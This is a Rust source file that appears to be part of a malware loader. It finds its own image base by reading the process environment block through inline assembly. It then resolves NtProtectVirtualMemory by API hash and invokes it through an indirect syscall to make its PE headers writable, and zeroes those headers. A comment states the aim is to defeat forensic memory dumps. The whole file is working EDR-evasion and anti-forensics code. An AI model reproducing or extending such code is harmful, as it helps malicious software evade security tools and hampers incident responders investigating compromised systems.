/// Read PEB.ImageBaseAddress (+0x10) to get own PE base without GetModuleHandleA.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn get_own_image_base() -> *mut u8 {
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, readonly, preserves_flags),
    );
    if peb.is_null() { return core::ptr::null_mut(); }
    *(peb.add(0x10) as *const *mut u8)
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn get_own_image_base() -> *mut u8 {
    windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(core::ptr::null()) as *mut u8
}

/// Zero-out the PE headers of the current process image.
/// Removes MZ/PE signature and section table from memory, making forensic
/// dumps unable to reconstruct the loader structure.
#[cfg(target_os = "windows")]
pub unsafe fn wipe_pe_headers() {
    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
    use crate::resolve::api_hash::h;

    let base = get_own_image_base();
    if base.is_null() { return; }

    let e_lfanew = core::ptr::read_unaligned(base.add(0x3C) as *const u32) as usize;
    let pe_base  = base.add(e_lfanew);
    let size_of_headers = core::ptr::read_unaligned(pe_base.add(0x54) as *const u32) as usize;
    if size_of_headers == 0 || size_of_headers > 0x10000 { return; }

    let ph = usize::MAX; // -1 = current process

    if let Some((prot_ssn, prot_tramp)) = get_ssn_h(h::NT_PROT_VM) {
        let mut pbase = base as usize; let mut sz = size_of_headers; let mut old = 0u32;
        let r = indirect_syscall(prot_ssn, prot_tramp, ph,
            &mut pbase as *mut usize as usize, &mut sz as *mut usize as usize,
            0x04, &mut old as *mut u32 as usize, 0); // PAGE_READWRITE
        if r == 0 {
            core::ptr::write_bytes(base, 0u8, size_of_headers);
            let mut pbase2 = base as usize; let mut sz2 = size_of_headers;
            indirect_syscall(prot_ssn, prot_tramp, ph,
                &mut pbase2 as *mut usize as usize, &mut sz2 as *mut usize as usize,
                old as usize, &mut old as *mut u32 as usize, 0);
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn wipe_pe_headers() {}
